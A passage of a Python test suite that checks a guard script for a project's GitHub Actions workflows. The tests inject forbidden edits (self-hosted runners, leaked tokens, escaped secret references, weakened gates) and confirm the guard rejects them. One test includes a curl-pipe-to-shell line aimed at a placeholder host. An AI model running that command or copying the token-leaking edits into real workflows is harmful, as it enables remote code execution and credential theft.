        self.assertEqual(1, source.count("      - run: python3 scripts/test-ci-skip.py\n"))
        for name in ("ci-skip-decision.py", "test-ci-skip.py"):
            self.assertTrue((ROOT / "scripts" / name).is_file())

    # ELZ-066: the hosted lane. A repository variable picks the lane; the hosted jobs are pinned
    # by their exact header, run on one label and have no job container.
    def change_in_job(self, filename, job, old, new):
        path = self.root / ".github" / "workflows" / filename
        source = path.read_text()
        start = source.index(f"\n  {job}:\n") + 1
        following = [i for i in (source.find("\n  check-", start + 1), source.find("\n  gleam", start + 1)) if i != -1]
        end = min(following) + 1 if following else len(source)
        block = source[start:end]
        self.assertIn(old, block)
        path.write_text(source[:start] + block.replace(old, new, 1) + source[end:])

    HOSTED_JOBS = (("symbolic-check.yml", "check-hosted"), ("symbolic-gleam.yml", "gleam-hosted"))

    def test_hosted_label_must_be_exactly_ubuntu_24_04(self):
        for filename, job in self.HOSTED_JOBS:
            for label in ("ubuntu-latest", "ubuntu-22.04", "ubuntu-24.04-arm", "ubuntu-24.04-8core",
                          "[self-hosted, ubuntu-24.04]", "[ubuntu-24.04]", "macos-latest", "windows-latest",
                          "${{ vars.ELZOO_CI_LABEL }}"):
                with self.subTest(job=job, label=label):
                    self.change_in_job(filename, job, "runs-on: ubuntu-24.04", f"runs-on: {label}")
                    self.assertIn("every job must use runs-on: ubuntu-24.04", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_hosted_job_must_not_gain_a_job_container(self):
        for filename, job in self.HOSTED_JOBS:
            with self.subTest(job=job):
                self.change_in_job(filename, job, "    steps:\n", "    container:\n      image: " + IMAGE + "\n    steps:\n")
                self.assertIn("a hosted job must not use a job container", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_hosted_job_header_is_pinned(self):
        for filename, job, old, new in (
                # work jobs: time limit, environment and the database service
                ("symbolic-check.yml", "check-root", "timeout-minutes: 120", "timeout-minutes: 360"),
                ("symbolic-check.yml", "check-consumers-db", "timeout-minutes: 120", "timeout-minutes: 360"),
                ("symbolic-check.yml", "check-consumers", "      contents: read\n", "      contents: write\n"),
                ("symbolic-check.yml", "check-root", "      contents: read\n", "      contents: read\n      actions: read\n"),
                ("symbolic-check.yml", "check-root", "ERL_FLAGS: '+S 4:4 +SDcpu 1 +SDio 1'", "ERL_FLAGS: '+S 8:8'"),
                ("symbolic-check.yml", "check-consumers", "postgres:16-bookworm@sha256:5264710be20f409750ac6dc4e5706dcef929c87e241605463f0f9aefa932a8d9", "postgres:16-bookworm"),
                ("symbolic-check.yml", "check-root", "          - 5432:5432\n", "          - 5432:5432\n          - 22:22\n"),
                ("symbolic-check.yml", "check-consumers-db", "    services:\n", "    outputs:\n      x: y\n    services:\n"),
                # the plan job: the token permission (actions: read) is its own, with the output and the time limit
                ("symbolic-check.yml", "check-plan", "timeout-minutes: 20", "timeout-minutes: 360"),
                ("symbolic-check.yml", "check-plan", "      actions: read\n", "      actions: write\n"),
                ("symbolic-check.yml", "check-plan", "      contents: read\n", "      contents: write\n"),
                ("symbolic-check.yml", "check-plan", "      run: ${{ steps.plan.outputs.run }}\n", "      run: true\n"),
                ("symbolic-check.yml", "check-plan", "    outputs:\n      run: ${{ steps.plan.outputs.run }}\n",
                 "    outputs:\n      run: ${{ steps.plan.outputs.run }}\n      other: ${{ steps.plan.outputs.run }}\n"),
                # the aggregating job
                ("symbolic-check.yml", "check-hosted", "timeout-minutes: 10", "timeout-minutes: 360"),
                ("symbolic-check.yml", "check-hosted", "      contents: read\n", "      contents: write\n"),
                ("symbolic-check.yml", "check-hosted", "      contents: read\n", "      contents: read\n      actions: read\n"),
                ("symbolic-gleam.yml", "gleam-hosted", "timeout-minutes: 30", "timeout-minutes: 360"),
                ("symbolic-gleam.yml", "gleam-hosted", "working-directory: spikes/gleam_ui", "working-directory: ."),
                ("symbolic-gleam.yml", "gleam-hosted", "    steps:\n", "    permissions:\n      contents: write\n    steps:\n")):
            with self.subTest(job=job, new=new.strip()[:40]):
                self.change_in_job(filename, job, old, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_hosted_identity_gate_cannot_change(self):
        for filename, job in self.HOSTED_JOBS:
            for old, new in (('test "$RUNNER_ENVIRONMENT" = github-hosted', 'test "$RUNNER_ENVIRONMENT" = self-hosted'),
                             ('test "$RUNNER_OS" = Linux\n          ', ''),
                             ('test "$VERSION_ID" = 24.04', 'test "$VERSION_ID" = 22.04'),
                             ("Verify the GitHub-hosted runner", "Verify runner")):
                with self.subTest(job=job, old=old[:30]):
                    self.change_in_job(filename, job, old, new)
                    self.assertIn("approved runner identity gate is missing or changed", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_hosted_gate_step_cannot_be_conditional(self):
        self.change_in_job("symbolic-check.yml", "check-hosted", "      - name: Verify the GitHub-hosted runner\n",
                           "      - name: Verify the GitHub-hosted runner\n        if: ${{ false }}\n")
        self.assertTrue(self.check(1).stderr)

    def test_job_gates_are_pinned(self):
        for filename, job, old, new in (
                ("symbolic-check.yml", "check-hosted", "github.event_name == 'push' || ", ""),
                ("symbolic-check.yml", "check-hosted", "github.event_name == 'workflow_dispatch' || ", ""),
                ("symbolic-check.yml", "check-hosted", "(github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository)", "github.event_name == 'pull_request'"),
                ("symbolic-check.yml", "check-hosted", "github.event_name == 'push' ||", "github.event_name == 'pull_request_target' || github.event_name == 'push' ||"),
                ("symbolic-gleam.yml", "gleam-hosted", "github.event.pull_request.head.repo.full_name == github.repository", "true"),
                ("symbolic-gleam.yml", "gleam-hosted", "github.event_name != 'pull_request' || ", "")):
            with self.subTest(job=job, old=old[:40], new=new[:30]):
                self.change_in_job(filename, job, old, new)
                self.assertIn("same-repository PR job gate is missing or changed", self.check(1).stderr)
                self.tearDown()
                self.setUp()


    def test_hosted_jobs_are_required(self):
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        source = path.read_text()
        path.write_text(source[:source.index("\n  check-hosted:\n")] + "\n")
        self.assertIn("exactly the jobs check-plan, check-root, check-consumers-db, check-consumers, check-hosted are required, in this order", self.check(1).stderr)
        self.tearDown()
        self.setUp()
        path = self.root / ".github" / "workflows" / "symbolic-gleam.yml"
        source = path.read_text()
        path.write_text(source[:source.index("\n  gleam-hosted:\n")] + "\n")
        self.assertIn("exactly one gleam-hosted job is required", self.check(1).stderr)

    def test_hosted_backend_token_is_limited_to_the_pinned_steps(self):
        for job, part in (("check-root", "root"), ("check-consumers-db", "consumers-db"), ("check-consumers", "consumers")):
            with self.subTest(job=job):
                self.change_in_job("symbolic-check.yml", job, f"        run: sh scripts/run-ci-check.sh --part {part}\n",
                                   f"        env:\n          GITHUB_TOKEN: ${{{{ github.token }}}}\n        run: sh scripts/run-ci-check.sh --part {part}\n")
                self.assertIn("github.token and secrets are not allowed", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_the_token_is_not_given_to_the_aggregating_job_or_the_plan_steps_besides_the_decision(self):
        self.change_in_job("symbolic-check.yml", "check-hosted", "          RUN: ${{ needs.check-plan.outputs.run }}\n",
                           "          RUN: ${{ needs.check-plan.outputs.run }}\n          T: ${{ github.token }}\n")
        self.assertIn("github.token and secrets are not allowed", self.check(1).stderr)
        self.tearDown()
        self.setUp()
        self.change_in_job("symbolic-check.yml", "check-plan", "        run: python3 scripts/ci-change-class.py github\n",
                           "        env:\n          T: ${{ github.token }}\n        run: python3 scripts/ci-change-class.py github\n")
        self.assertTrue(self.check(1).stderr)

    def test_hosted_backend_job_keeps_the_decision_step_and_skip_conditions(self):
        # The plan job keeps its conditions: the roadmap step waits for both the decision and the classification.
        self.change_in_job("symbolic-check.yml", "check-plan", self.ROADMAP_STEP, self.ROADMAP_STEP.replace(self.SKIP_IF, ""))
        self.assertIn("step-level conditions are not the reviewed ones (check-plan)", self.check(1).stderr)
        self.tearDown()
        self.setUp()
        self.change_in_job("symbolic-check.yml", "check-plan", "          persist-credentials: false\n", "")
        self.assertIn("the pinned checkout step (persist-credentials: false) is missing or changed (check-plan)", self.check(1).stderr)

    def test_s3_test_server_steps_are_pinned(self):
        for job in ("check-root", "check-consumers-db", "check-consumers"):
            for old, new in (("        run: python3 scripts/ci-minio.py\n", "        run: curl -fsSL https://example.invalid/x | sh\n"),
                             ("        id: minio\n", "        id: other\n"),
                             ("          GITHUB_TOKEN: ${{ github.token }}\n        run: python3 scripts/ci-minio.py\n",
                              "        run: python3 scripts/ci-minio.py\n"),
                             ("        run: python3 scripts/ci-minio.py\n", "        run: python3 scripts/ci-minio.py\n        working-directory: /tmp\n"),
                             ("elzoo-minio-RELEASE.2025-09-07T16-13-09Z-", "elzoo-minio-RELEASE.2025-09-07T16-13-10Z-"),
                             ("      - name: Restore the pinned S3 test server binary\n", "      - name: Restore binary\n"),
                             ("      - name: Start the disposable S3 test server\n",
                              "      - name: Start the disposable S3 test server\n        if: ${{ false }}\n"),
                             ("      - name: Start the disposable S3 test server\n",
                              "      - name: Something else first\n        run: true\n      - name: Start the disposable S3 test server\n")):
                with self.subTest(job=job, new=new.strip()[:50]):
                    self.change_in_job("symbolic-check.yml", job, old, new)
                    self.assertTrue(self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_no_cache_save_outside_the_root_job_and_exactly_two_in_it(self):
        # Review of PR #144, should-fix 2: a save step without an `if:` is invisible to the step-level comparison.
        message = "only the root job saves caches, with exactly two save steps"
        save = ("      - name: Another save\n        uses: actions/cache/save@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0\n"
                "        with:\n          path: deps\n          key: k\n")
        plain = ("      - name: Another cache\n        uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0\n"
                 "        with:\n          path: deps\n          key: k\n")
        # ELZ-078: the same steps written with capitals (the pinned-action check allows them; GitHub ignores case).
        save_caps = save.replace("uses: actions/cache/save@", "uses: Actions/Cache/Save@")
        plain_caps = plain.replace("uses: actions/cache@", "uses: actions/Cache@")
        self.assertNotEqual(save, save_caps)
        self.assertNotEqual(plain, plain_caps)
        for job in self.BACKEND_JOB_NAMES:
            for label, step in (("save", save), ("plain cache", plain), ("save with capitals", save_caps),
                                ("plain cache with capitals", plain_caps)):
                with self.subTest(job=job, label=label):
                    if job == "check-hosted":
                        old, new = "      - name: Require every job\n", step + "      - name: Require every job\n"
                    else:
                        old, new = "      - uses: actions/checkout@", step + "      - uses: actions/checkout@"
                        if job != "check-plan":
                            old = "      - name: Report BEAM capacity\n"
                            new = step + old
                    self.change_in_job("symbolic-check.yml", job, old, new)
                    self.assertIn(message, self.check(1).stderr)
                    self.tearDown()
                    self.setUp()
        # a third save in the root job, and one save step less
        for third in (save, save_caps, plain_caps):
            self.change_in_job("symbolic-check.yml", "check-root", "      - name: Report BEAM capacity\n", third + "      - name: Report BEAM capacity\n")
            self.assertIn(message, self.check(1).stderr)
            self.tearDown()
            self.setUp()

    def test_a_part_marker_is_never_printed_by_the_workflow(self):
        for job in self.BACKEND_JOB_NAMES:
            for marker in ("ELZOO ROOT SUITE PASSED", "ELZOO CONSUMERS DB PASSED", "ELZOO CONSUMERS PASSED"):
                with self.subTest(job=job, marker=marker):
                    step = f"      - run: echo \"{marker}\"\n"
                    anchor = "      - name: Require every job\n" if job == "check-hosted" else "      - uses: actions/checkout@"
                    if job in self.WORK_JOB_NAMES:
                        anchor = "      - name: Report BEAM capacity\n"
                    self.change_in_job("symbolic-check.yml", job, anchor, step + anchor)
                    self.assertIn(f"a part marker may be printed by mix check --part only, not by the workflow ({job})", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_a_key_cannot_be_appended_to_a_pinned_step(self):
        # Review of PR #144, note 2: the end of a pinned step is part of the pin.
        # ELZ-078: each case names the pinned step it must break, with the job.
        for job, pinned, step, extra in (
                ("check-root", "name: Run mix check", "        run: sh scripts/run-ci-check.sh --part root\n", "        env:\n          X: y\n"),
                ("check-consumers", "name: Run mix check", "        run: sh scripts/run-ci-check.sh --part consumers\n", "        timeout-minutes: 1\n"),
                ("check-hosted", "name: Require every job", "            test \"$CONSUMERS\" = skipped\n          fi\n", "        timeout-minutes: 1\n"),
                ("check-plan", "name: Plan the work jobs",
                 "          echo \"ELZOO PLAN: run=$RUN skip=${SKIP:-unset} docs_only=${DOCS_ONLY:-unset}\"\n",
                 "        continue-on-error: true\n")):
            with self.subTest(job=job, extra=extra.strip()):
                self.change_in_job("symbolic-check.yml", job, step, step + extra)
                self.assertIn(f"the pinned step \"{pinned}\" is missing or changed ({job})", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_the_s3_save_step_belongs_to_the_root_job_only(self):
        # Three jobs saving the same cache key would race; the other jobs only restore. The save step and its
        # condition are pinned in the root job and refused in the others.
        root_job = self.source().split("\n  check-consumers-db:\n")[0].split("\n  check-root:\n")[1]
        save = root_job[root_job.index("      - name: Save the pinned S3 test server binary\n"):]
        save = save[:save.index("      - uses: erlef/setup-beam")]
        self.assertIn("steps.minio.outputs.source != 'cache'", save)
        for job in ("check-consumers-db", "check-consumers"):
            with self.subTest(job=job):
                self.change_in_job("symbolic-check.yml", job, "      - uses: erlef/setup-beam", save + "      - uses: erlef/setup-beam")
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()
        self.change_in_job("symbolic-check.yml", "check-root", save, "")
        self.assertIn("the pinned S3 test server steps are missing or changed (check-root)", self.check(1).stderr)

    def test_s3_test_server_steps_cannot_be_removed(self):
        for job in ("check-root", "check-consumers-db", "check-consumers"):
            with self.subTest(job=job):
                path = self.root / ".github" / "workflows" / "symbolic-check.yml"
                source = path.read_text()
                start = source.index(f"\n  {job}:\n")
                first = source.index("      - name: Restore the pinned S3 test server binary\n", start)
                last = source.index("      - uses: erlef/setup-beam", first)
                path.write_text(source[:first] + source[last:])
                self.assertIn(f"the pinned S3 test server steps are missing or changed ({job})", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_hosted_gleam_setup_step_is_pinned_per_job(self):
        self.change_in_job("symbolic-gleam.yml", "gleam-hosted", self.GLEAM_STEP, "      - run: ./scripts/setup.sh\n")
        self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)
        self.tearDown()
        self.setUp()
        self.change_in_job("symbolic-gleam.yml", "gleam-hosted", "        run: ./scripts/setup.sh\n",
                           "        run: ./scripts/setup.sh\n        if: ${{ false }}\n")
        self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)

    def test_vars_in_any_case_or_script_text_rejected(self):
        for filename, job, old in (("symbolic-check.yml", "check-plan", "      - run: python3 scripts/check-claims.py\n"),
                                   ("symbolic-gleam.yml", "gleam-hosted", "      - run: ./scripts/check.sh\n")):
            for line in ("        env:\n          LANE: ${{ vars.ELZOO_CI_LANE }}\n        run: true\n",
                         "        env:\n          LANE: ${{ Vars.elzoo_ci_lane }}\n        run: true\n",
                         "        run: |\n          echo \"${{ vars.ANYTHING }}\"\n",
                         "        run: |\n          echo '${{ toJSON(vars) }}'\n",
                         "        run: |\n          echo '${{ toJson(VARS) }}'\n"):
                with self.subTest(job=job, line=line.strip()[:40]):
                    self.change_in_job(filename, job, old, old + "      - name: Lane\n" + line)
                    self.assertIn("vars and the repository variable ELZOO_CI_LANE are not allowed", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_hosted_job_must_end_with_its_steps_list(self):
        for filename, job in self.HOSTED_JOBS:
            for extra in ("    environment: production\n", "    continue-on-error: true\n",
                          "    strategy:\n      matrix:\n        x: [1]\n",
                          "    services:\n      other:\n        image: " + IMAGE + "\n"):
                with self.subTest(job=job, extra=extra.strip()[:30]):
                    path = self.root / ".github" / "workflows" / filename
                    source = path.read_text()
                    start = source.index(f"\n  {job}:\n")
                    following = source.find("\n  gleam", start + 1) if job != "gleam-hosted" else -1
                    end = following if following != -1 else len(source)
                    path.write_text(source[:end].rstrip("\n") + "\n" + extra + source[end:])
                    self.assertTrue(self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_hosted_gleam_checkout_and_steps_are_pinned(self):
        for old, new in (("          persist-credentials: false\n", "          persist-credentials: true\n"),
                         ("          persist-credentials: false\n", "          persist-credentials: false\n          ref: main\n"),
                         ("      - run: ./scripts/check.sh\n", "      - run: ./scripts/check.sh\n        if: ${{ false }}\n"),
                         ("      - run: ./scripts/check.sh\n", "      - run: ./scripts/check.sh\n        continue-on-error: true\n"),
                         ("      - run: ./scripts/check.sh\n", "      - run: ./scripts/check.sh\n        shell: bash {0}\n")):
            with self.subTest(new=new.strip()[:40]):
                self.change_in_job("symbolic-gleam.yml", "gleam-hosted", old, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_yaml_escapes_cannot_hide_the_token_secrets_or_vars(self):
        for filename, job, old in (("symbolic-check.yml", "check-plan", "      - run: python3 scripts/check-claims.py\n"),
                                   ("symbolic-gleam.yml", "gleam-hosted", "      - run: ./scripts/check.sh\n")):
            for value in ('"${{ github.t\\x6fken }}"', '"${{ github.t\\u006fken }}"', '"${{ s\\x65crets.X }}"',
                          '"${{ v\\x61rs.X }}"'):
                with self.subTest(job=job, value=value):
                    self.change_in_job(filename, job, old, old + "      - name: Escaped\n        env:\n          T: " + value + "\n        run: true\n")
                    self.assertIn("escapes in double-quoted scalars", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    # ELZ-069: the self-hosted lane is gone; nothing of it may come back silently.
    def test_jobs_must_keep_their_names(self):
        self.change("symbolic-check.yml", "  check-hosted:\n", "  check-renamed:\n")
        self.assertIn("exactly the jobs check-plan, check-root, check-consumers-db, check-consumers, check-hosted are required, in this order", self.check(1).stderr)
        self.tearDown()
        self.setUp()
        self.change("symbolic-gleam.yml", "  gleam-hosted:\n", "  gleam:\n")
        self.assertIn("exactly one gleam-hosted job is required", self.check(1).stderr)

    def test_removed_jobs_cannot_come_back(self):
        for filename, name, message in (("symbolic-check.yml", "check-fast", "are required, in this order"),
                                        ("symbolic-check.yml", "check-any", "are required, in this order"),
                                        ("symbolic-gleam.yml", "gleam", "job is required")):
            with self.subTest(job=name):
                self.append(filename, f"\n  {name}:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: true\n")
                self.assertIn(message, self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_self_hosted_runner_cannot_come_back(self):
        for filename, selector in (("symbolic-check.yml", self.BACKEND_SELECTOR), ("symbolic-gleam.yml", self.GLEAM_SELECTOR)):
            for new in ("    runs-on: self-hosted\n", "    runs-on: [self-hosted, linux, x64]\n",
                        "    runs-on: [self-hosted, ubuntu-24.04]\n", "    runs-on: ${{ 'self-hosted' }}\n",
                        "    runs-on: [Self-Hosted]\n"):
                with self.subTest(file=filename, runs_on=new.strip()):
                    self.change(filename, selector, new)
                    self.assertIn("self-hosted", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_self_hosted_text_anywhere_rejected(self):
        # Even in a comment or script text: the guard reads raw lines, so a hidden selector cannot sit there.
        self.change("symbolic-check.yml", "    timeout-minutes: 120\n", "    timeout-minutes: 120\n    # runs-on: self-hosted\n")
        self.assertIn("self-hosted runners are not allowed", self.check(1).stderr)

    def test_labels_list_on_a_job_rejected(self):
        for filename, job in self.HOSTED_JOBS:
            for new in ("    labels:\n      - linux\n", "    labels: [linux]\n"):
                with self.subTest(job=job, labels=new.strip()):
                    self.change_in_job(filename, job, "    steps:\n", new + "    steps:\n")
                    self.assertIn("a labels: list could select a runner", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_tier_input_and_dispatch_inputs_rejected(self):
        for inputs in ("    inputs:\n      tier:\n        type: choice\n        options: [fast, any]\n",
                       "    inputs:\n      runner:\n        type: string\n"):
            for filename in ("symbolic-check.yml", "symbolic-gleam.yml"):
                with self.subTest(file=filename, inputs=inputs.strip()[:30]):
                    self.change(filename, "  workflow_dispatch:\n", "  workflow_dispatch:\n" + inputs)
                    stderr = self.check(1).stderr
                    self.assertIn("triggers must be exactly", stderr)
                    self.assertIn("inputs", stderr)
                    self.tearDown()
                    self.setUp()

    def test_vars_cannot_come_back_at_workflow_or_job_level(self):
        for filename in ("symbolic-check.yml", "symbolic-gleam.yml"):
            with self.subTest(file=filename):
                self.change(filename, "\npermissions:\n  contents: read\n",
                            "\nenv:\n  LANE: ${{ vars.ELZOO_CI_LANE }}\n\npermissions:\n  contents: read\n")
                self.assertIn("vars and the repository variable ELZOO_CI_LANE are not allowed", self.check(1).stderr)
                self.tearDown()
                self.setUp()
        self.change("symbolic-check.yml", "    if: ${{ github.event_name == 'push' ||", "    if: ${{ vars.ELZOO_CI_LANE == 'hosted' && github.event_name == 'push' ||")
        self.assertIn("vars and the repository variable ELZOO_CI_LANE are not allowed", self.check(1).stderr)

    # ELZ-059: the pull request run is the merge evidence, so it runs the full check, and a stale
    # generated roadmap view fails the job.
    ROADMAP_STEP = "      - name: Check the roadmap views\n" + SKIP_IF + "        run: python3 scripts/check-roadmap.py\n"

    def test_roadmap_step_is_present_and_pinned(self):
        self.assertEqual(1, self.source().count(self.ROADMAP_STEP))
        for new in ("",                                                              # removed
                    self.ROADMAP_STEP.replace(self.SKIP_IF, ""),                      # always runs
                    self.ROADMAP_STEP.replace(self.SKIP_IF, "        if: ${{ false }}\n"),
                    self.ROADMAP_STEP.replace(self.SKIP_IF, "        if: always()\n"),
                    self.ROADMAP_STEP.replace(self.SKIP_IF, "        if: ${{ github.event_name == 'push' }}\n"),
                    self.ROADMAP_STEP.replace("scripts/check-roadmap.py", "scripts/check-roadmap.py --write"),
                    self.ROADMAP_STEP + "        continue-on-error: true\n"):
            with self.subTest(new=new.strip()[:70]):
                self.change("symbolic-check.yml", self.ROADMAP_STEP, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_the_roadmap_step_runs_in_the_plan_job_after_the_decision(self):
        # The roadmap step waits for the decision and the classification, so it sits after both; moved before the
        # decision step it would read outputs that do not exist yet (an empty output is not "true", so it would run).
        self.assertEqual(1, self.source().count(self.ROADMAP_STEP))
        self.change_in_job("symbolic-check.yml", "check-root", "      - name: Verify the GitHub-hosted runner\n",
                           self.ROADMAP_STEP + "      - name: Verify the GitHub-hosted runner\n")
        self.assertIn("step-level conditions are not the reviewed ones (check-root)", self.check(1).stderr)

    # ELZ-071: a documentation-only pull request skips the heavy steps and runs the short check; the queue
    # accepts the marker line only when its own classification agrees. Every new step and condition is pinned.
    CLASS_STEP = "      - name: Classify the change\n        id: class\n        run: python3 scripts/ci-change-class.py github\n"
    DOCS_ONLY_STEP = ('      - name: Docs-only check\n        if: ${{ steps.class.outputs.docs_only == \'true\' }}\n'
                      "        run: |\n          python3 scripts/check-claims.py\n          python3 scripts/check-roadmap.py\n"
                      '          echo "ELZOO DOCS-ONLY CHECK PASSED"\n')
    HEAVY_STEPS = ("      - name: Restore the pinned S3 test server binary\n", "      - name: Start the disposable S3 test server\n",
                   "      - uses: erlef/setup-beam@54075bcc5e249e4758d363f27d099f55d843f124 # v1\n",
                   "      - name: Report BEAM capacity\n", "      - name: Restore dependency cache\n",
                   "      - run: mix local.hex --force\n", "      - run: mix local.rebar --force\n", "      - run: mix setup\n",
                   "      - name: Run mix check\n", "      - name: Check the roadmap views\n")

    def test_the_classify_step_is_present_and_pinned(self):
        self.assertEqual(1, self.source().count(self.CLASS_STEP))
        for new in ("",                                                                              # removed
                    self.CLASS_STEP.replace("ci-change-class.py github", "ci-change-class.py range a b"),
                    self.CLASS_STEP.replace("        id: class\n", "        id: other\n"),
                    self.CLASS_STEP.replace("        id: class\n", "        id: class\n        if: ${{ false }}\n"),
                    self.CLASS_STEP.replace("        id: class\n", "        id: class\n        continue-on-error: true\n"),
                    self.CLASS_STEP.replace("ci-change-class.py github", "ci-change-class.py github || true"),
                    self.CLASS_STEP.replace("run: python3 scripts/ci-change-class.py github", "run: echo docs_only=true >> $GITHUB_OUTPUT"),
                    self.CLASS_STEP + "        env:\n          GITHUB_TOKEN: ${{ github.token }}\n"):
            with self.subTest(new=new.strip()[:70]):
                self.change("symbolic-check.yml", self.CLASS_STEP, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_the_classifier_tests_run_in_the_job(self):
        step = "      - run: python3 scripts/test-ci-change-class.py\n"
        self.assertEqual(1, self.source().count(step))
        self.change("symbolic-check.yml", step, "")
        self.assertIn("test-ci-change-class.py", self.check(1).stderr)

    def test_the_docs_only_step_is_present_and_pinned(self):
        self.assertEqual(1, self.source().count(self.DOCS_ONLY_STEP))
        d = self.DOCS_ONLY_STEP
        for new in ("",                                                                                  # removed
                    d.replace("== \'true\'", "!= \'true\'"),                                              # inverted
                    d.replace("        if: ${{ steps.class.outputs.docs_only == \'true\' }}\n", ""),     # always runs
                    d.replace("        if: ${{ steps.class.outputs.docs_only == \'true\' }}\n", "        if: always()\n"),
                    d.replace("          python3 scripts/check-roadmap.py\n", ""),                       # check dropped
                    d.replace("          python3 scripts/check-claims.py\n", ""),
                    d.replace("check-roadmap.py\n", "check-roadmap.py || true\n"),
                    d.replace("          python3 scripts/check-roadmap.py\n", "          python3 scripts/check-roadmap.py --write\n"),
                    d.replace("ELZOO DOCS-ONLY CHECK PASSED", "ELZOO CHECK PASSED"),                   # the full marker
                    d.replace("ELZOO DOCS-ONLY CHECK PASSED", "ELZOO DOCS-ONLY CHECK PASSED forged"),
                    d + "        continue-on-error: true\n",
                    d.replace("          python3 scripts/check-claims.py\n", "          exit 0\n          python3 scripts/check-claims.py\n")):
            with self.subTest(new=new.strip()[:80]):
                self.change("symbolic-check.yml", d, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_the_docs_only_marker_comes_from_one_pinned_step_only(self):
        # The queue reads the marker line; no other step may print it (an extra step could forge it).
        source = self.source()
        self.assertEqual(1, source.count("ELZOO DOCS-ONLY CHECK PASSED"))
        self.change("symbolic-check.yml", "      - name: Report container resource observations\n",
                    '      - run: echo "ELZOO DOCS-ONLY CHECK PASSED"\n      - name: Report container resource observations\n')
        self.assertTrue(self.check(1).stderr)

    WORK_JOB_NAMES = ("check-root", "check-consumers-db", "check-consumers")
    BACKEND_JOB_NAMES = ("check-plan", "check-root", "check-consumers-db", "check-consumers", "check-hosted")
    WORK_HEAD = "    if: ${{ needs.check-plan.outputs.run == 'true' }}\n    needs: check-plan\n"

    def test_every_work_job_waits_for_the_plan(self):
        # The work jobs run only when the plan says so (not on a push that the skip decision covers, not on a
        # documentation-only change): the job-level condition and the dependency are pinned in each job.
        for job in self.WORK_JOB_NAMES:
            self.assertEqual(1, self.job_text(job).count(self.WORK_HEAD))
            for new in ("",                                                                              # no condition
                        "    needs: check-plan\n",                                                       # no if
                        "    if: ${{ needs.check-plan.outputs.run == 'true' }}\n",                       # no needs
                        "    if: ${{ always() }}\n    needs: check-plan\n",
                        "    if: ${{ true }}\n    needs: check-plan\n",
                        "    if: ${{ needs.check-plan.outputs.run != 'false' }}\n    needs: check-plan\n",
                        "    if: ${{ needs.check-plan.outputs.run }}\n    needs: check-plan\n",
                        "    if: ${{ needs.check-plan.outputs.run == 'true' || always() }}\n    needs: check-plan\n",
                        "    if: ${{ needs.check-plan.outputs.run == 'false' }}\n    needs: check-plan\n",
                        "    needs: check-plan\n    if: ${{ needs.check-plan.outputs.run == 'true' }}\n",   # other order
                        "    if: ${{ needs.check-plan.outputs.run == 'true' }}\n    needs: [check-plan, check-hosted]\n",
                        "    if: ${{ needs.check-plan.outputs.run == 'true' }}\n    needs: check-root\n"):
                with self.subTest(job=job, new=new.strip()[:70]):
                    self.change_in_job("symbolic-check.yml", job, self.WORK_HEAD, new)
                    self.assertIn(f"{job}: same-repository PR job gate is missing or changed", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def job_text(self, job):
        source = self.source()
        start = source.index(f"\n  {job}:\n") + 1
        following = [i for i in (source.find("\n  check-", start + 1), source.find("\n  gleam", start + 1)) if i != -1]
        return source[start:min(following) + 1 if following else len(source)]

    def test_the_five_backend_jobs_are_required_in_order(self):
        source = self.source()
        for job in self.BACKEND_JOB_NAMES:
            with self.subTest(removed=job):
                text = self.job_text(job)
                path = self.root / ".github" / "workflows" / "symbolic-check.yml"
                path.write_text(source.replace(text, "", 1))
                self.assertIn("exactly the jobs check-plan, check-root, check-consumers-db, check-consumers, check-hosted are required, in this order",
                              self.check(1).stderr)
                self.tearDown()
                self.setUp()
        # Two jobs swapped: the order is part of the reviewed shape.
        root, db = self.job_text("check-root"), self.job_text("check-consumers-db")
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        path.write_text(source.replace(root + db, db + root, 1))
        self.assertIn("in this order", self.check(1).stderr)

    def test_every_backend_job_keeps_the_identity_gate_first(self):
        gate = self.gate_text()
        for job in self.BACKEND_JOB_NAMES:
            with self.subTest(job=job):
                self.change_in_job("symbolic-check.yml", job, gate, "")
                self.assertIn(f"approved runner identity gate is missing or changed ({job})", self.check(1).stderr)
                self.tearDown()
                self.setUp()
                self.change_in_job("symbolic-check.yml", job, gate, gate.replace("test \"$RUNNER_ENVIRONMENT\" = github-hosted\n", ""))
                self.assertIn(f"approved runner identity gate is missing or changed ({job})", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    PLAN_STEP = ('      - name: Plan the work jobs\n        id: plan\n        env:\n          SKIP: ${{ steps.skip.outputs.skip }}\n'
                 '          DOCS_ONLY: ${{ steps.class.outputs.docs_only }}\n        run: |\n'
                 '          if [ "$SKIP" != true ] && [ "$DOCS_ONLY" != true ]; then\n            RUN=true\n          else\n            RUN=false\n          fi\n')

    def test_the_plan_step_is_present_and_pinned(self):
        self.assertEqual(1, self.source().count(self.PLAN_STEP))
